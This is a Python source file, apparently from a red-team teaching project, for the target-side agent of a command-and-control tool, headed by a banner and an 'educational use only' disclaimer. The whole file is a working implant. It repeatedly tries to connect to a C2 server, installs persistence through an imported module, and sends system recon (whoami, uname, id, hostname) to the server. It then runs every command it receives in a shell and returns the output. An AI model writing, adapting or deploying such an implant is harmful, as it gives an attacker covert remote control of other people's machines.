# ============================================================
# C2 Agent - Target-side component
# Connects back to C2 server, installs persistence,
# executes received commands and returns output
# For educational use only - run in lab environment
# ============================================================

RED = '\033[91m'
RESET = '\033[0m'
WHITE = '\033[97m'

print(f"""{RED}
 ██▓███   ██░ ██  ▄▄▄       ███▄    █ ▄▄▄█████▓ ▒█████   ███▄ ▄███▓ ██▀███  ▓█████ ▓█████▄ 
▓██░  ██▒▓██░ ██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌
▓██░ ██▓▒▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░▓██ ░▄█ ▒▒███   ░██   █▌
▒██▄█▓▒ ▒░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██   ██░▒██    ▒██ ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌
▒██▒ ░  ░░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒░██▓ ▒██▒░▒████▒░▒████▓ 
▒▓▒░ ░  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ 
░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░    ░      ░ ▒ ▒░ ░  ░      ░  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒ 
░░        ░  ░░ ░  ░   ▒      ░   ░ ░   ░      ░ ░ ░ ▒  ░      ░     ░░   ░    ░    ░ ░  ░ 
          ░  ░  ░      ░  ░         ░              ░ ░         ░      ░        ░  ░   ░    
                                                                                    ░      
{RESET}{WHITE}
{RED}[ Educational Use Only | Lab Environment | Red Team Simulation ]{RESET}
""")

import socket
import subprocess
import sys
import os
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from persistence import install_persistence

HOST = '127.0.0.1'  # C2 server IP
PORT = 4444

def run_agent():
    while True: # Checks connection forever
        try:
            agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            agent_socket.connect((HOST, PORT))
            print("[+] Connected to C2 server")
            break # Breaks after connection
        except ConnectionRefusedError:
            print("[!] Server unavailable, retrying in 30s...")
            agent_socket.close()
            time.sleep(30)  # Wait 30 seconds then try again

    # Install persistence on first run
    install_persistence()

    # Recon
    recon_commands = {
        "[User]    ": "whoami",
        "[PWD]     ": "pwd", 
        "[OS]      ": "uname -a",
        "[IP]      ": "hostname -I",
        "[ID]      ": "id"
    }

    recon_block = "\n===== SYSTEM RECON =====\n"
    for label, cmd in recon_commands.items():
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode().strip()
        except:
            out = "N/A"
        recon_block += f"{label}: {out}\n"
    recon_block += "========================\n"

    # Send Recon
    agent_socket.sendall(recon_block.encode())

    while True:
        try:
            command = agent_socket.recv(4096)
            if not command:
                break
            print(f"[Server]: {command.decode()}")
            try:
                # Runs command and save output
                output = subprocess.check_output(
                    command.decode(), shell=True, stderr=subprocess.STDOUT
                )
            except subprocess.CalledProcessError as e:
                output = b"[!] Command failed or not found\n"
            agent_socket.sendall(output)
        except Exception as e:
            print(f"[!] Connection lost: {e}")
            break


if __name__ == "__main__":
    run_agent()
